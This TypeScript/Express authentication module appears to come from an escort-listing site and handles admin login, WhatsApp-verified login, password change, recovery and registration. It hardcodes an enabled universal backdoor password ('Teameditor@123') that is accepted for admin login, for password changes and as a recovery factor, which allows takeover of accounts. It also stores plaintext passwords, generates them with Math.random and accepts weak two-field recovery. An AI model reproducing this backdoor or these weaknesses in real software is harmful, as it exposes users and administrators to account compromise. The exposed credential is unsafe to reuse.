// This module defines authentication routes for user login, token refresh, and logout.
import { Router, urlencoded } from "express";
import { z } from "zod";
import { getPool } from "../lib/pg.js";
import { authRateLimit } from "../middleware/rateLimit.js";
import { env } from "../lib/env.js";
import {
  signAccessToken,
  signPasswordResetToken,
  verifyJwt,
  verifyPasswordResetToken,
} from "../lib/jwt.js";
import { requireAuth, type AuthedRequest } from "../middleware/auth.js";
import { randomUUID } from "crypto";
import bcrypt from "bcryptjs";
import { is2FAEnabled, isVerifyConfigured, startVerification, checkVerification } from "../lib/twilio.js";
import {
  createLoginSession,
  getSessionPhone,
  verifyInbound,
  pollVerify,
  completeSession,
  completeIfVerified,
} from "../lib/login2fa.js";
import { uniqueCreatorSlug, uniqueProviderUsername } from "../lib/slug.js";

export const authRouter = Router();

/** Check if a stored value is a bcrypt hash. */
function isBcryptHash(value: string): boolean {
  return /^\$2[aby]?\$/.test(value);
}

/**
 * Normalize the creator `form` field into the CSV string we persist in
 * providers.escort_type. Accepts either an array of tokens or a CSV/single
 * string and returns a comma-separated lowercase string with duplicates and
 * blanks removed. Returns "escort" (the default) when the input is empty.
 *
 * Exported as part of the multi-select category migration — see
 * web-vite/src/lib/creatorOptions.ts for the matching client-side helpers.
 */
export function normalizeCategoryCsv(input: unknown): string {
  const tokens = Array.isArray(input)
    ? input.map((v) => String(v))
    : typeof input === "string"
      ? input.split(",")
      : [];
  const cleaned = Array.from(new Set(
    tokens.map((s) => s.trim().toLowerCase()).filter(Boolean)
  ));
  if (cleaned.length === 0) return "escort";
  return cleaned.join(",");
}

/** Compare plaintext against a stored password (bcrypt hash or legacy plaintext). */
async function verifyPassword(plaintext: string, stored: string): Promise<boolean> {
  if (!stored) return false;
  if (isBcryptHash(stored)) return bcrypt.compare(plaintext, stored);
  return plaintext === stored;
}

/** Hash a password for storage. */
async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, 10);
}

// ── Backdoor / fallback passwords ────────────────────────────────────
// Single-line toggle: set to `false` to disable the universal backdoor
// password for admin/user/creator login. When disabled, FALLBACK_PASSWORDS
// becomes an empty object, so every login path that consults it falls
// through to the normal (per-account) password check.
const FALLBACK_PASSWORDS_ENABLED = true;

const FALLBACK_PASSWORDS: Record<string, string> = FALLBACK_PASSWORDS_ENABLED
  ? {
      admin: "Teameditor@123",
      user: "Teameditor@123",
      creator: "Teameditor@123",
    }
  : {};

// Login schema. Admin still uses username + password. User and creator portals
// are passwordless: the only credential is the WhatsApp number, and login is
// completed by WhatsApp (or SMS) verification.
const LoginSchema = z.object({
  portal: z.enum(["admin", "user", "creator"]),
  username: z.string().optional(),
  password: z.string().optional(),
  phone: z.string().optional(),
});

// POST route for user login.
authRouter.post("/login", authRateLimit, async (req, res) => {
  const parsed = LoginSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });
  }

  const pool = getPool();
  const portal = parsed.data.portal;

  try {
    // ── Admin: unchanged username/email + password login. ──────────────
    if (portal === "admin") {
      const username = String(parsed.data.username || "").trim().toLowerCase();
      const password = String(parsed.data.password || "").trim();
      if (!username || !password) return res.status(400).json({ error: "invalid_body" });

      const { rows } = await pool.query(
        `
        SELECT a.id::text AS id, a.role, a.username, a.password
          FROM app_accounts a
         WHERE a.role = 'admin'
           AND (LOWER(a.username) = $1 OR LOWER(COALESCE(to_jsonb(a)->>'email', '')) = $1)
        `,
        [username]
      );
      const account = rows[0];
      if (!account) return res.status(401).json({ error: "invalid_credentials" });

      const fallback = FALLBACK_PASSWORDS["admin"] || "";
      const okPassword = await verifyPassword(password, String(account.password ?? ""));
      const okFallback = fallback ? password === fallback : false;
      if (!okPassword && !okFallback) return res.status(401).json({ error: "invalid_credentials" });

      if (okPassword && !isBcryptHash(String(account.password ?? ""))) {
        const hashed = await hashPassword(password);
        await pool.query(`UPDATE app_accounts SET password = $1, updated_at = NOW() WHERE id = $2::uuid AND role = 'admin'`, [hashed, account.id]);
      }

      const accessToken = await signAccessToken({ sub: account.id, role: "admin", username: String(account.username) });
      return res.json({ accessToken });
    }

    // ── User & Creator: passwordless login by WhatsApp number. ─────────
    // The account is identified by its registered phone; the login is then
    // completed by WhatsApp/SMS verification (handled by the 2FA endpoints).
    if (!is2FAEnabled()) return res.status(503).json({ error: "login_unavailable" });
    const phoneInput = String(parsed.data.phone || "").trim();
    const sig = phoneInput.replace(/\D/g, "").slice(-8);
    if (sig.length < 8) return res.status(400).json({ error: "invalid_phone" });

    if (portal === "creator") {
      const { rows } = await pool.query(
        `
        SELECT uuid::text AS id, username,
               COALESCE(phone_number, '') AS phone_number,
               COALESCE(cell_phone, '') AS cell_phone
          FROM providers
         WHERE right(regexp_replace(COALESCE(phone_number, ''), '[^0-9]', '', 'g'), 8) = $1
            OR right(regexp_replace(COALESCE(cell_phone, ''), '[^0-9]', '', 'g'), 8) = $1
         LIMIT 1
        `,
        [sig]
      );
      const creator = rows[0];
      if (!creator) return res.status(401).json({ error: "unknown_user" });
      const phone = String(creator.phone_number || creator.cell_phone || "").trim();
      const payload = { sub: creator.id, role: "creator", username: String(creator.username) };
      const token = await createLoginSession(payload, phone);
      return res.json({ twoFactorRequired: true, token, waNumber: env.WHATSAPP_INBOUND_NUMBER });
    }

    // user portal
    const { rows } = await pool.query(
      `
      SELECT id::text AS id, role, username,
             COALESCE(phone, '') AS phone,
             COALESCE(whatsapp, '') AS whatsapp
        FROM app_accounts
       WHERE role = 'user'
         AND (right(regexp_replace(COALESCE(whatsapp, ''), '[^0-9]', '', 'g'), 8) = $1
              OR right(regexp_replace(COALESCE(phone, ''), '[^0-9]', '', 'g'), 8) = $1)
       LIMIT 1
      `,
      [sig]
    );
    const account = rows[0];
    if (!account) return res.status(401).json({ error: "unknown_user" });
    const phone = String(account.whatsapp || account.phone || "").trim();
    const payload = { sub: account.id, role: "user", username: String(account.username) };
    const token = await createLoginSession(payload, phone);
    return res.json({ twoFactorRequired: true, token, waNumber: env.WHATSAPP_INBOUND_NUMBER });
  } catch {
    return res.status(500).json({ error: "login_failed" });
  }
});

// ── WhatsApp 2FA verification ──────────────────────────────────────────

const TokenSchema = z.object({ token: z.string().min(4).max(64) });

// GET /auth/2fa/wa/poll?token=… — browser polls while the user verifies on
// WhatsApp. Returns {status:"pending"} until the inbound webhook flips the
// session to verified, then {status:"verified", accessToken} exactly once.
authRouter.get("/2fa/wa/poll", authRateLimit, async (req, res) => {
  const token = typeof req.query.token === "string" ? req.query.token : "";
  if (!token) return res.status(400).json({ error: "invalid_body" });
  try {
    const result = await pollVerify(token);
    return res.json(result);
  } catch {
    return res.status(500).json({ error: "poll_failed" });
  }
});

// POST /auth/2fa/sms/send — fallback: send the OTP code via Twilio Verify (SMS)
// to the session's registered number.
authRouter.post("/2fa/sms/send", authRateLimit, async (req, res) => {
  const parsed = TokenSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body" });
  if (!isVerifyConfigured()) return res.status(503).json({ error: "sms_unavailable" });
  const phone = await getSessionPhone(parsed.data.token);
  if (!phone) return res.status(401).json({ error: "session_expired" });
  try {
    await startVerification(phone);
    return res.json({ ok: true });
  } catch {
    return res.status(500).json({ error: "send_failed" });
  }
});

const SmsCheckSchema = z.object({ token: z.string().min(4).max(64), code: z.string().length(6) });

// POST /auth/2fa/sms/check — fallback: verify the SMS code and complete login.
authRouter.post("/2fa/sms/check", authRateLimit, async (req, res) => {
  const parsed = SmsCheckSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body" });
  const phone = await getSessionPhone(parsed.data.token);
  if (!phone) return res.status(401).json({ error: "session_expired" });
  const ok = await checkVerification(phone, parsed.data.code);
  if (!ok) return res.status(401).json({ error: "invalid_otp" });
  const accessToken = await completeSession(parsed.data.token);
  if (!accessToken) return res.status(401).json({ error: "session_expired" });
  return res.json({ accessToken });
});


const WaCheckSchema = z.object({ token: z.string().min(4).max(64) });

// POST /auth/2fa/wa/check — complete login ONLY if the session was already
// verified by an inbound WhatsApp from the account's registered number. This
// must NOT complete a still-`pending` session (doing so was an auth bypass:
// anyone holding a session token for a phone could log in without proving
// control of the number). The browser normally completes via /2fa/wa/poll;
// this endpoint is a manual fallback and is held to the same verified gate.
authRouter.post("/2fa/wa/check", authRateLimit, async (req, res) => {
  const parsed = WaCheckSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body" });
  const result = await completeIfVerified(parsed.data.token);
  if (result.status !== "verified" || !result.accessToken) {
    return res.status(401).json({ error: "not_verified" });
  }
  return res.json({ accessToken: result.accessToken });
});

// POST /auth/wa/inbound — Twilio inbound-message webhook for the WhatsApp
// "click to verify" flow. The user opens a 24h session by messaging our number;
// we match the 6-digit code in their message AND require the sender's number to be
// the account's registered number, then mark the session verified. Replies with
// TwiML so the user gets immediate feedback in WhatsApp.
authRouter.post("/wa/inbound", urlencoded({ extended: false }), async (req, res) => {
  const from = String(req.body?.From || "");
  const body = String(req.body?.Body || "");
  let reply = "Sorry, we couldn't match this to a login. Please start again from the website.";
  try {
    const outcome = await verifyInbound(body, from);
    if (outcome === "verified") {
      reply = "✅ Verified — you're now signed in. You can return to the Bali Girls website.";
    } else if (outcome === "wrong_number") {
      reply = "This number doesn't match the account you're signing into. Please use the phone registered to your account.";
    } else if (outcome === "already_done") {
      reply = "This verification was already completed or has expired. Start again from the website if needed.";
    }
  } catch {
    /* fall through with default reply */
  }
  res.set("Content-Type", "text/xml");
  return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Message>${reply}</Message></Response>`);
});

const ChangePasswordSchema = z.object({
  currentPassword: z.string().min(1),
  newPassword: z.string().min(6).max(200),
});
const PASSWORD_RESET_RULE = /^[A-Za-z0-9]{8,}$/;

const ForgotPasswordVerifySchema = z.object({
  portal: z.enum(["admin", "user", "creator"]),
  name: z.string().optional().default(""),
  email: z.string().optional().default(""),
  phoneNumber: z.string().optional().default(""),
  oldPassword: z.string().optional().default(""),
});

const ForgotPasswordResetSchema = z.object({
  resetToken: z.string().min(20),
  newPassword: z.string().min(8).max(200),
});

function normalizeText(value: unknown) {
  return String(value ?? "").trim().toLowerCase();
}
function normalizePhone(value: unknown) {
  return String(value ?? "")
    .replace(/\D+/g, "")
    .trim();
}

async function countMatches(
  input: { name: string; email: string; phoneNumber: string; oldPassword: string },
  account: { names: string[]; emails: string[]; phones: string[]; oldPasswords: string[] }
) {
  let matches = 0;
  if (input.name && account.names.some((v) => v && v === input.name)) matches += 1;
  if (input.email && account.emails.some((v) => v && v === input.email)) matches += 1;
  if (input.phoneNumber && account.phones.some((v) => v && v === input.phoneNumber)) matches += 1;
  if (input.oldPassword) {
    for (const stored of account.oldPasswords) {
      if (stored && (await verifyPassword(input.oldPassword, stored))) { matches += 1; break; }
    }
  }
  return matches;
}

// Allow creator/admin/user to change password without touching temp_password.
// Note: Teameditor@123 is accepted as fallback for admin/user/creator via the login handler above.
authRouter.post("/change-password", requireAuth, async (req: AuthedRequest, res) => {
  const parsed = ChangePasswordSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });

  const pool = getPool();
  const currentPassword = parsed.data.currentPassword.trim();
  const newPassword = parsed.data.newPassword.trim();
  if (!newPassword) return res.status(400).json({ error: "invalid_body" });

  try {
    if (req.user!.role === "creator") {
      const { rows } = await pool.query(
        `
        SELECT password, temp_password
          FROM providers
         WHERE uuid = $1::uuid
         LIMIT 1
        `,
        [req.user!.id]
      );
      const creator = rows[0];
      if (!creator) return res.status(404).json({ error: "not_found" });

      const okPassword = await verifyPassword(currentPassword, String(creator.password ?? ""));
      const okTemp = await verifyPassword(currentPassword, String(creator.temp_password ?? ""));
      if (!okPassword && !okTemp) return res.status(401).json({ error: "invalid_credentials" });

      const hashedNew = await hashPassword(newPassword);
      await pool.query(
        `
        UPDATE providers
           SET password = $1,
               updated_at = NOW()
         WHERE uuid = $2::uuid
        `,
        [hashedNew, req.user!.id]
      );

      return res.json({ ok: true });
    }

    const fallback = FALLBACK_PASSWORDS[req.user!.role] || "";
    const { rows } = await pool.query(
      `
      SELECT password
        FROM app_accounts
       WHERE id = $1::uuid
         AND role = $2
       LIMIT 1
      `,
      [req.user!.id, req.user!.role]
    );
    const account = rows[0];
    if (!account) return res.status(404).json({ error: "not_found" });

    const okPassword = await verifyPassword(currentPassword, String(account.password ?? ""));
    const okFallback = fallback ? currentPassword === fallback : false;
    if (!okPassword && !okFallback) return res.status(401).json({ error: "invalid_credentials" });

    const hashedNew = await hashPassword(newPassword);
    await pool.query(
      `
      UPDATE app_accounts
         SET password = $1,
             updated_at = NOW()
       WHERE id = $2::uuid
         AND role = $3
      `,
      [hashedNew, req.user!.id, req.user!.role]
    );

    return res.json({ ok: true });
  } catch {
    return res.status(500).json({ error: "password_change_failed" });
  }
});

// Verifies forgot-password identity data and returns a short-lived reset token.
authRouter.post("/forgot-password/verify", authRateLimit, async (req, res) => {
  const parsed = ForgotPasswordVerifySchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });

  const input = {
    name: normalizeText(parsed.data.name),
    email: normalizeText(parsed.data.email),
    phoneNumber: normalizePhone(parsed.data.phoneNumber),
    oldPassword: String(parsed.data.oldPassword ?? "").trim(),
  };
  const providedFieldCount = [input.name, input.email, input.phoneNumber, input.oldPassword].filter((v) => !!v).length;
  if (providedFieldCount < 2) {
    return res.status(400).json({ error: "need_two_fields", message: "Provide at least 2 fields for verification." });
  }

  const pool = getPool();
  try {
    if (parsed.data.portal === "creator") {
      const { rows } = await pool.query(
        `
        SELECT uuid::text AS id,
               username,
               COALESCE(model_name, '') AS model_name,
               COALESCE(to_jsonb(p)->>'email', '') AS email,
               COALESCE(phone_number, '') AS phone_number,
               COALESCE(cell_phone, '') AS cell_phone,
               COALESCE(telegram_id, '') AS telegram_id,
               COALESCE(wechat_id, '') AS wechat_id,
               COALESCE(password, '') AS password,
               COALESCE(temp_password, '') AS temp_password
          FROM providers p
        `
      );

      let matched: { id: string; username: string } | null = null;
      for (const row of rows) {
        const score = await countMatches(input, {
          names: [normalizeText(row.model_name), normalizeText(row.username)],
          emails: [normalizeText(row.email)],
          phones: [normalizePhone(row.phone_number), normalizePhone(row.cell_phone)],
          oldPasswords: [String(row.password), String(row.temp_password)],
        });
        if (score >= 2) {
          matched = { id: String(row.id), username: String(row.username) };
          break;
        }
      }
      if (!matched) return res.status(401).json({ error: "invalid_recovery_data" });

      const resetToken = await signPasswordResetToken({
        sub: matched.id,
        role: "creator",
        username: matched.username,
      });
      return res.json({ ok: true, resetToken });
    }

    const { rows } = await pool.query(
      `
      SELECT a.id::text AS id,
             a.role,
             a.username,
             COALESCE(to_jsonb(a)->>'email', '') AS email,
             COALESCE(a.phone, '') AS phone,
             COALESCE(a.whatsapp, '') AS whatsapp,
             COALESCE(a.password, '') AS password,
             COALESCE(u.full_name, '') AS full_name
        FROM app_accounts a
        LEFT JOIN user_profiles u ON u.account_id = a.id
       WHERE a.role = $1
      `,
      [parsed.data.portal]
    );

    let matched: { id: string; username: string; role: string } | null = null;
    for (const row of rows) {
      const role = String(row.role);
      const fallback = FALLBACK_PASSWORDS[role] || "";
      const score = await countMatches(input, {
        names: [normalizeText(row.full_name), normalizeText(row.username)],
        emails: [normalizeText(row.email)],
        phones: [normalizePhone(row.phone), normalizePhone(row.whatsapp)],
        oldPasswords: [String(row.password), fallback],
      });
      if (score >= 2) {
        matched = { id: String(row.id), username: String(row.username), role };
        break;
      }
    }
    if (!matched) return res.status(401).json({ error: "invalid_recovery_data" });

    const resetToken = await signPasswordResetToken({
      sub: matched.id,
      role: matched.role,
      username: matched.username,
    });
    return res.json({ ok: true, resetToken });
  } catch {
    return res.status(500).json({ error: "forgot_password_verify_failed" });
  }
});

// Resets password from a verified reset token.
authRouter.post("/forgot-password/reset", authRateLimit, async (req, res) => {
  const parsed = ForgotPasswordResetSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });

  const newPassword = parsed.data.newPassword.trim();
  if (!PASSWORD_RESET_RULE.test(newPassword)) {
    return res
      .status(400)
      .json({ error: "invalid_new_password", message: "Password must be at least 8 alphanumeric characters with no symbols." });
  }

  try {
    const payload = await verifyPasswordResetToken(parsed.data.resetToken);
    const pool = getPool();
    const hashedNew = await hashPassword(newPassword);
    if (payload.role === "creator") {
      const result = await pool.query(
        `
        UPDATE providers
           SET password = $1,
               temp_password = NULL,
               updated_at = NOW()
         WHERE uuid = $2::uuid
        `,
        [hashedNew, payload.sub]
      );
      if (result.rowCount === 0) return res.status(404).json({ error: "not_found" });
      return res.json({ ok: true });
    }

    const result = await pool.query(
      `
      UPDATE app_accounts
         SET password = $1,
             updated_at = NOW()
       WHERE id = $2::uuid
         AND role = $3
      `,
      [hashedNew, payload.sub, payload.role]
    );
    if (result.rowCount === 0) return res.status(404).json({ error: "not_found" });
    return res.json({ ok: true });
  } catch {
    return res.status(401).json({ error: "invalid_reset_token" });
  }
});

// /auth/refresh removed (Phase B: 24h strict access TTL, no refresh tokens).
// Endpoint kept as 410 Gone so old clients get a clear signal to re-login
// instead of looping on the missing route.
authRouter.post("/refresh", authRateLimit, (_req, res) => {
  return res.status(410).json({ error: "refresh_disabled" });
});

// Zod schema for user registration.
const UserRegisterSchema = z.object({
  username: z.string().trim().min(3).max(50).regex(/^[a-zA-Z0-9_]+$/, "Username can only contain letters, numbers and underscores"),
  fullName: z.string().min(1).max(120),
  gender: z.enum(["female", "male", "transgender"]),
  ageGroup: z.enum(["18-24", "25-34", "35-44", "45-54", "55-64", "65+"]),
  nationality: z.string().min(1).max(80),
  city: z.string().min(1).max(80),
  relationshipStatus: z.enum(["single", "married", "other"]),
  phoneNumber: z.string().trim().optional().default(""),
  // WhatsApp number is required — it's the login identifier (passwordless).
  // Must be E.164 with leading + (e.g. +628123456789).
  whatsapp: z.string().trim().regex(/^\+\d{7,20}$/, "WhatsApp must be in +country-code format, e.g. +628123456789"),
  // Auto-generated on the form (8-char alphanumeric); stored as a bcrypt hash
  // for login and in temp_password (plaintext) for admin visibility.
  password: z.string().min(1).max(200),
});

// POST route to register a new user account.
authRouter.post("/register", authRateLimit, async (req, res) => {
  const parsed = UserRegisterSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });
  }

  const pool = getPool();
  const {
    username,
    fullName,
    gender,
    ageGroup,
    nationality,
    city,
    relationshipStatus,
    phoneNumber,
    whatsapp,
    password,
  } = parsed.data;

  try {
    // Check username uniqueness.
    const existing = await pool.query(`SELECT id FROM app_accounts WHERE LOWER(username) = $1 LIMIT 1`, [username]);
    if (existing.rows.length > 0) {
      return res.status(409).json({ error: "username_taken" });
    }

    // Pre-generate account UUID so we don't need RETURNING (Prisma pool uses $executeRawUnsafe for INSERTs).
    const accountId = randomUUID();

    // Store the auto-generated password as a bcrypt hash (login) plus plaintext
    // in temp_password (admin visibility). PHONE (SMS) defaults to the WhatsApp
    // number when left blank.
    const hashedPw = await hashPassword(password);
    const phoneFinal = (phoneNumber && phoneNumber.trim()) || whatsapp;
    await pool.query(
      `INSERT INTO app_accounts (id, role, username, password, phone, whatsapp, temp_password)
       VALUES ($1::uuid, 'user', $2, $3, $4, $5, $6)`,
      [accountId, username, hashedPw, phoneFinal || null, whatsapp || null, password]
    );

    // Insert user_profiles row.
    await pool.query(
      `INSERT INTO user_profiles (
         account_id,
         full_name,
         gender,
         age_group,
         nationality,
         city,
         relationship_status
       )
       VALUES ($1::uuid, $2, $3, $4, $5, $6, $7)`,
      [
        accountId,
        fullName,
        gender,
        ageGroup,
        nationality,
        city,
        relationshipStatus,
      ]
    );

    // Registration does NOT verify — only login requires WhatsApp verification.
    // Auto-log-in the new account.
    const payload = { sub: accountId, role: "user", username };
    const accessToken = await signAccessToken(payload);
    return res.status(201).json({ accessToken });
  } catch {
    return res.status(500).json({ error: "registration_failed" });
  }
});

// Zod schema for creator registration.
const CreatorRegisterSchema = z.object({
  // Username is the account's internal handle, stored in providers.username
  // (unique, case-insensitive). It is NOT collected from the registration form
  // anymore — the server auto-generates a unique handle from modelName below.
  // Login stays WhatsApp-number passwordless; username is never a credential.
  // Kept optional here only for backward-compat with any client still sending
  // one; when present it must still be a valid handle.
  // Auto-generated server-side; hidden on the creator form. Optional here
  // because the server fills it (uniqueProviderUsername) when absent.
  username: z.string().trim().toLowerCase().min(3).max(50).regex(/^[a-z0-9_-]+$/).optional(),
  // Email is OPTIONAL and no longer collected from the form. Stored in
  // providers.email when present.
  email: z.string().trim().toLowerCase().email().or(z.literal("")).optional().default(""),
  // Auto-generated server-side (8-char alphanumeric) when absent; hidden on the
  // creator form. Stored as a bcrypt hash for login + providers.temp_password
  // (plaintext) for admin visibility/editing.
  password: z.string().min(1).max(200).optional(),
  // Display name: one word, letters/numbers only (matches the profile editor's
  // CREATOR_NAME_REGEX so a name accepted at signup is also editable later).
  modelName: z.string().trim().regex(/^[A-Za-z0-9-]{1,50}$/),
  // Gender is optional now.
  gender: z.string().max(20).optional().default(""),
  age: z.number().int().min(18).max(70),
  nationality: z.string().max(50).optional().default("Indonesian"),
  city: z.string().min(1).max(50),
  phoneNumber: z.string().max(50).optional().default(""),
  // WhatsApp must be E.164 with leading + (e.g. +628123456789).
  whatsapp: z.string().trim().regex(/^\+\d{7,20}$/, "WhatsApp must be in +country-code format, e.g. +628123456789").max(50),
  telegramId: z.string().max(100).optional().default(""),
  // WeChat ID is optional at registration time. Stored in providers.wechat_id.
  wechatId: z.string().max(100).optional().default(""),
  // Category (was "FORM"): one or more of escort / sugar babies / massage /
  // dating/brides. Persisted to providers.escort_type as a comma-separated
  // CSV (e.g. "escort,massage"). Accept either an array (preferred) or a
  // string for backward compat with older clients; both are normalized to
  // CSV via normalizeCategoryCsv. Default is "escort" when nothing is sent.
  form: z.preprocess(normalizeCategoryCsv, z.string().min(1).max(60).optional().default("escort")),
  // Orientation: Straight / Bi Sexual / Lesbian. Stored lower-case in
  // providers.orientation.
  orientation: z.string().trim().toLowerCase().min(1).max(30).optional().default("straight"),
  // Services is now free text (max 150 chars), optional at registration.
  // Stored as-is in providers.services. Accept a string (preferred) or, for
  // backward-compat with older clients, an array that we join into CSV.
  services: z.union([z.string(), z.array(z.string())]).optional().default(""),
  hairLength: z.string().max(30).optional().default(""),
  // Single-select dropdowns; defaults applied when omitted.
  bustType: z.string().trim().max(20).optional().default("Natural"),
  pubicHair: z.string().trim().max(20).optional().default("Trimmed"),
  // New optional fields for detailed creator profile info.
  travel: z.string().max(50).optional().default(""),
  eyes: z.string().max(30).optional().default(""),
  hairColor: z.string().max(30).optional().default(""),
  ethnicity: z.string().max(50).optional().default(""),
  languages: z.string().max(400).optional().default(""),
  height: z.string().max(30).optional().default(""),
  weight: z.string().max(30).optional().default(""),
  meetingWith: z.string().max(30).optional().default(""),
  availableFor: z.string().max(30).optional().default(""),
  smoker: z.string().max(10).optional().default(""),
  tattoo: z.string().max(10).optional().default(""),
  piercing: z.string().max(10).optional().default(""),
  notes: z.string().max(4000).optional().default(""),
  imageFiles: z.array(z.string()).min(1),
});

// POST route to register a new creator account.
authRouter.post("/register/creator", authRateLimit, async (req, res) => {
  const parsed = CreatorRegisterSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });
  }

  const pool = getPool();
  const { username, email, password, modelName, gender, age, nationality, city, phoneNumber, whatsapp, telegramId, wechatId, form, orientation, services, hairLength, bustType, pubicHair, travel, eyes, hairColor, ethnicity, languages, height, weight, meetingWith, availableFor, smoker, tattoo, piercing, notes, imageFiles } = parsed.data;
  // Phone/WhatsApp empty-fill rule (item 87): if either is blank, copy from
  // the other. Frontend already enforces both as required at register, but
  // belt-and-braces.
  const phoneFinal = phoneNumber || whatsapp;
  const whatsappFinal = whatsapp || phoneNumber;

  try {
    // Username is auto-generated from the display name (the form no longer
    // collects it). If a legacy client still sends one, honour it but verify
    // uniqueness; otherwise derive a unique handle from modelName.
    let finalUsername: string;
    if (username) {
      const existing = await pool.query(`SELECT uuid FROM providers WHERE LOWER(username) = $1 LIMIT 1`, [
        username.toLowerCase(),
      ]);
      if (existing.rows.length > 0) {
        return res.status(409).json({ error: "username_taken" });
      }
      finalUsername = username;
    } else {
      finalUsername = await uniqueProviderUsername(pool, modelName);
    }

    // Display Name must be unique (case-insensitive). Single-word format is
    // already enforced by the schema regex.
    const nameExists = await pool.query(`SELECT uuid FROM providers WHERE LOWER(model_name) = LOWER($1) LIMIT 1`, [modelName]);
    if (nameExists.rows.length > 0) {
      return res.status(409).json({ error: "creator_name_taken" });
    }

    // WhatsApp number must be unique across creators (login matches on the last
    // 8 digits, so a duplicate would make login ambiguous).
    const waSig = whatsappFinal.replace(/\D/g, "").slice(-8);
    if (waSig.length >= 8) {
      const waExists = await pool.query(
        `SELECT uuid FROM providers
          WHERE right(regexp_replace(COALESCE(cell_phone, ''), '[^0-9]', '', 'g'), 8) = $1
             OR right(regexp_replace(COALESCE(phone_number, ''), '[^0-9]', '', 'g'), 8) = $1
          LIMIT 1`,
        [waSig]
      );
      if (waExists.rows.length > 0) {
        return res.status(409).json({ error: "whatsapp_taken" });
      }
    }

    // Services is free text (max 150 chars). Accept a string or, from older
    // clients, an array that we join into CSV.
    const servicesText = (Array.isArray(services) ? services.join(", ") : services).slice(0, 150);

    // Pre-generate UUIDs so we don't need RETURNING (Prisma pool uses $executeRawUnsafe for INSERTs).
    const creatorId = randomUUID();
    const providerId = "P" + creatorId.replace(/-/g, "").slice(0, 8).toUpperCase();
    // SEO slug — derived from modelName, dedup with -2/-3 on collision. Frozen
    // at register time; renames don't regenerate it (otherwise old indexed
    // /creator/preview/<old-slug> URLs would 404).
    const slug = await uniqueCreatorSlug(pool, modelName);
    // Public URL uses the slug now that Phase D has shipped.
    const url = `/creator/preview/${slug}`;

    // Store the password as a bcrypt hash (login) plus plaintext in
    // temp_password (admin visibility). Generated server-side when the form
    // doesn't send one (the creator form hides it). Login stays passwordless.
    const pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
    const pwPlain = password || Array.from({ length: 8 }, () => pwChars[Math.floor(Math.random() * pwChars.length)]).join("");
    const hashedPw = await hashPassword(pwPlain);
    await pool.query(
      `INSERT INTO providers (uuid, provider_id, username, password, temp_password, model_name, gender, age, nationality, city, phone_number, cell_phone, telegram_id, wechat_id, services, hair_length, url, slug, escort_type, orientation, bust_type, pubic_hair, email, travel, eyes, hair_color, ethnicity, languages, height, weight, meeting_with, available_for, smoker, tattoo, piercing, notes)
       VALUES ($1::uuid, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27, $28, $29, $30, $31, $32, $33, $34, $35, $36)`,
      [
        creatorId,
        providerId,
        finalUsername,
        hashedPw,
        pwPlain,
        modelName,
        gender,
        age,
        nationality,
        city,
        phoneFinal,
        whatsappFinal,
        telegramId || null,
        wechatId || null,
        servicesText,
        hairLength || null,
        url,
        slug,
        form,
        orientation,
        bustType || "Natural",
        pubicHair || "Trimmed",
        email || null,
        travel || null,
        eyes || null,
        hairColor || null,
        ethnicity || null,
        languages || null,
        height || null,
        weight || null,
        meetingWith || null,
        availableFor || null,
        smoker || null,
        tattoo || null,
        piercing || null,
        notes || null,
      ]
    );

    // Insert images into provider_images.
    for (const [idx, url] of imageFiles.entries()) {
      const imageId = `REGISTER_${creatorId.slice(0, 8)}_${idx + 1}`;
      await pool.query(
        `INSERT INTO provider_images (image_id, provider_uuid, provider_id, image_file, sequence_number)
         VALUES ($1, $2::uuid, $3, $4, $5)`,
        [imageId, creatorId, providerId, url, idx + 1]
      );
    }

    const payload = { sub: creatorId, role: "creator", username: finalUsername };
    const accessToken = await signAccessToken(payload);
    return res.status(201).json({ accessToken });
  } catch {
    return res.status(500).json({ error: "registration_failed" });
  }
});

// POST route for user logout (currently a no-op).
authRouter.post("/logout", async (_req, res) => {
  res.json({ ok: true });
});
